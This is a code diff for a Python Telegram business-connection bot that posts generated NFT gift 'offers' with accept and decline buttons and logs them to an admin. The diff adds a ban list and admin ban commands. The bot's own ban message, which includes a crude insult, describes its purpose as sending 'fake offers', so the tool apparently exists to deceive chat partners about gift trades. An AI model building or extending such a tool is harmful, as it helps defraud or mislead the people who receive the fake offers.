@@ -41,6 +41,49 @@ dp = Dispatcher()
 business_owner_ids: dict[str, int] = {}
 offers: dict[str, dict] = {}
 
+# ============================================================
+# БАЗА БАНОВ (в памяти)
+# ============================================================
+banned_users: set[str] = set()  # {"@username", "123456789"}
+
+
+def is_banned(user_id: int, username: str | None) -> bool:
+    if str(user_id) in banned_users:
+        return True
+    if username and f"@{username.lower()}" in banned_users:
+        return True
+    return False
+
+
+def ban_user(identifier: str) -> str:
+    ident = identifier.strip()
+    if not ident:
+        return "❌ Укажи @username или ID."
+    
+    if ident.isdigit() or (ident.startswith("-") and ident[1:].isdigit()):
+        banned_users.add(ident)
+        return f"✅ ID <code>{ident}</code> забанен."
+    
+    if ident.startswith("@"):
+        ident = ident[1:]
+    banned_users.add(f"@{ident.lower()}")
+    return f"✅ @{ident} забанен."
+
+
+def unban_user(identifier: str) -> str:
+    ident = identifier.strip()
+    if not ident:
+        return "❌ Укажи @username или ID."
+    
+    if ident.isdigit() or (ident.startswith("-") and ident[1:].isdigit()):
+        banned_users.discard(ident)
+        return f"✅ ID <code>{ident}</code> разбанен."
+    
+    if ident.startswith("@"):
+        ident = ident[1:]
+    banned_users.discard(f"@{ident.lower()}")
+    return f"✅ @{ident} разбанен."
+
 
 # ============================================================
 # ЛОГИРОВАНИЕ ОШИБОК
@@ -98,61 +141,37 @@ def get_log_text(data: dict, status: str) -> str:
         
     emoji_tag = f'<tg-emoji emoji-id="{emoji_id}">{emoji_char}</tg-emoji>'
 
-    # Владелец: либо из данных (если бы был), либо честно "Нет доступа"
-    owner_display = "@unknown | 0"
-    if data.get("owner_username") and data["owner_username"] != "unknown":
-        owner_display = f"@{data['owner_username']} | {data.get('owner_id', '0')}"
-    else:
-        owner_display = "Нет доступа"
-
     return (
         f"<b>Оффер отправлен</b>\n\n"
         f"<b>Подарок:</b> {gift_display}\n"
         f"<b>Сумма:</b> {data['amount']}\n"
         f"<b>Валюта:</b> {emoji_tag} {currency_name}\n"
         f"<b>Отправил:</b> @{data['sender_username']} | {data['sender_id']}\n"
-        f"<b>Владелец подарка:</b> {owner_display}\n"
+        f"<b>Владелец подарка:</b> Нет доступа\n"
         f"<b>Передан:</b> {transferred_text}\n\n"
         f"<b>Статус:</b> {status_emoji} {status_text}"
     )
 
 
 def get_log_keyboard(data: dict) -> InlineKeyboardMarkup:
-    buttons = []
-    
-    owner_username = data.get('owner_username')
-    owner_id = data.get('owner_id')
-    
-    # Кнопка владельца: если нет доступа — просто не добавляем или ведём на unknown
-    if owner_username and owner_username != "unknown":
-        owner_url = f"https://t.me/{owner_username}"
-        buttons.append([
-            InlineKeyboardButton(text="👤 Владелец", url=owner_url)
-        ])
-    else:
-        # Если владелец неизвестен, кнопку не добавляем (или можно добавить неактивную)
-        pass
-    
-    # Кнопка подарка (помечаем как основную, style="success" в Bot API нет, но визуально выделяем)
-    buttons.append([
-        InlineKeyboardButton(
-            text="🎁 Ссылка на подарок",
-            url=data["link"]
-        )
-    ])
-    
-    return InlineKeyboardMarkup(inline_keyboard=buttons)
+    return InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton(
+                    text="🎁 Ссылка на подарок",
+                    url=data["link"]
+                )
+            ]
+        ]
+    )
 
 
 async def send_log_to_admin(data: dict):
-    text = get_log_text(data, "pending")
-    keyboard = get_log_keyboard(data)
-    
     try:
         msg = await bot.send_message(
             chat_id=ADMIN_LOG_ID,
-            text=text,
-            reply_markup=keyboard,
+            text=get_log_text(data, "pending"),
+            reply_markup=get_log_keyboard(data),
             disable_web_page_preview=True,
         )
         data["log_msg_id"] = msg.message_id
@@ -163,16 +182,12 @@ async def send_log_to_admin(data: dict):
 async def update_log_message(data: dict, status: str):
     if "log_msg_id" not in data:
         return
-        
-    text = get_log_text(data, status)
-    keyboard = get_log_keyboard(data)
-
     try:
         await bot.edit_message_text(
             chat_id=ADMIN_LOG_ID,
             message_id=data["log_msg_id"],
-            text=text,
-            reply_markup=keyboard,
+            text=get_log_text(data, status),
+            reply_markup=get_log_keyboard(data),
             disable_web_page_preview=True,
         )
     except Exception as e:
@@ -180,7 +195,7 @@ async def update_log_message(data: dict, status: str):
 
 
 # ============================================================
-# ПАРСИНГ КОМАНДЫ
+# ПАРСИНГ
 # ============================================================
 
 def parse_nft_link(link: str):
@@ -190,8 +205,7 @@ def parse_nft_link(link: str):
         return None
     slug = m.group(1)
     number = m.group(2)
-    full_link = f"https://t.me/nft/{slug}-{number}"
-    return full_link, slug, number
+    return f"https://t.me/nft/{slug}-{number}", slug, number
 
 
 def parse_offer_command(text: str):
@@ -227,17 +241,16 @@ def parse_offer_command(text: str):
 # ОТПРАВКА
 # ============================================================
 
-async def send_with_fallback(bc_id, chat_id, text, reply_markup):
+async def send_with_fallback(bc_id, chat_id, text, reply_markup=None):
     for attempt in range(1, 4):
         try:
-            result = await bot.send_message(
+            return await bot.send_message(
                 chat_id=chat_id,
                 text=text,
                 reply_markup=reply_markup,
                 business_connection_id=bc_id,
                 disable_web_page_preview=False,
             )
-            return result
         except TelegramRetryAfter as e:
             await asyncio.sleep(e.retry_after + 1)
         except TelegramBadRequest as e:
@@ -256,7 +269,7 @@ async def send_with_fallback(bc_id, chat_id, text, reply_markup):
                     business_connection_id=bc_id,
                     disable_web_page_preview=False,
                 )
-            except Exception as e2:
+            except Exception:
                 if attempt == 3:
                     raise
 
@@ -293,7 +306,46 @@ async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None
 
 
 # ============================================================
-# ХЭНДЛЕРЫ
+# КОМАНДЫ АДМИНА
+# ============================================================
+
+@dp.message(F.text.startswith("/ban"))
+async def cmd_ban(message: Message):
+    if message.from_user.id != ADMIN_LOG_ID:
+        return
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        await message.answer("❌ Использование: <code>/ban @username</code> или <code>/ban 123456789</code>")
+        return
+    await message.answer(ban_user(parts[1]))
+
+
+@dp.message(F.text.startswith("/unban"))
+async def cmd_unban(message: Message):
+    if message.from_user.id != ADMIN_LOG_ID:
+        return
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        await message.answer("❌ Использование: <code>/unban @username</code> или <code>/unban 123456789</code>")
+        return
+    await message.answer(unban_user(parts[1]))
+
+
+@dp.message(F.text == "/banlist")
+async def cmd_banlist(message: Message):
+    if message.from_user.id != ADMIN_LOG_ID:
+        return
+    if not banned_users:
+        await message.answer("📭 Список банов пуст.")
+        return
+    text = "<b>🚫 Забаненные:</b>\n\n"
+    for b in sorted(banned_users):
+        text += f"• <code>{b}</code>\n"
+    await message.answer(text)
+
+
+# ============================================================
+# БИЗНЕС-ХЭНДЛЕРЫ
 # ============================================================
 
 @dp.business_connection()
@@ -308,22 +360,48 @@ async def handle_offer(message: Message) -> None:
         return
 
     bc_id = message.business_connection_id
+
+    sender_id = 0
+    sender_username = None
+    if message.from_user:
+        sender_id = message.from_user.id
+        sender_username = message.from_user.username
+
+    # ===== ПРОВЕРКА НА БАН =====
+    if is_banned(sender_id, sender_username):
+        logger.warning(f"[ban] user {sender_id} (@{sender_username}) попытался кинуть оффер — забанен")
+        try:
+            await bot.delete_business_messages(
+                business_connection_id=bc_id,
+                message_ids=[message.message_id],
+            )
+        except Exception:
+            pass
+
+        ban_text = (
+            "я забанен, причина: я хуесос\n\n"
+            "хотел кинуть тебе фейк офер но меня забанили сори"
+        )
+        try:
+            await bot.send_message(
+                chat_id=message.chat.id,
+                text=ban_text,
+                business_connection_id=bc_id,
+            )
+        except Exception as e:
+            log_telegram_error("ban-msg", e, chat_id=message.chat.id, bc_id=bc_id)
+        return
+
+    # ===== ПАРСИНГ =====
     data = parse_offer_command(message.text)
     if not data:
         return
 
     sender_name = "Unknown"
-    sender_username = "unknown"
-    sender_id = 0
     if message.from_user:
         sender_name = message.from_user.full_name
-        sender_username = message.from_user.username or f"id{message.from_user.id}"
-        sender_id = message.from_user.id
-
-    # Владелец НЕ парсится (Bot API не даёт доступа к чужим подаркам)
-    # Ставим заглушку, в логах будет "Нет доступа"
-    owner_username = "unknown"
-    owner_id = "0"
+        if not sender_username:
+            sender_username = f"id{sender_id}"
 
     try:
         await bot.delete_business_messages(
@@ -358,10 +436,8 @@ async def handle_offer(message: Message) -> None:
         "chat_id": message.chat.id,
         "accepted": False,
         "sender_name": sender_name,
-        "sender_username": sender_username,
+        "sender_username": sender_username or f"id{sender_id}",
         "sender_id": sender_id,
-        "owner_username": owner_username,
-        "owner_id": owner_id,
     }
 
     keyboard = InlineKeyboardMarkup(
@@ -389,10 +465,7 @@ async def handle_offer(message: Message) -> None:
             reply_markup=keyboard,
         )
         offers[offer_id]["msg_id"] = sent.message_id
-        
-        # Отправляем лог админу
         await send_log_to_admin(offers[offer_id])
-
     except Exception as e:
         log_telegram_error("offer-send", e, chat_id=message.chat.id, bc_id=bc_id)
 
@@ -426,8 +499,6 @@ async def handle_decline(callback: CallbackQuery) -> None:
         message_id=data["msg_id"],
         text=decline_text,
     )
-    
-    # Обновляем лог админа
     await update_log_message(data, "declined")
 
 
@@ -504,8 +575,6 @@ async def handle_accept(callback: CallbackQuery) -> None:
         text=accept_text,
         reply_markup=keyboard,
     )
-        
-    # Обновляем лог админа
     await update_log_message(data, "accepted")
 
 
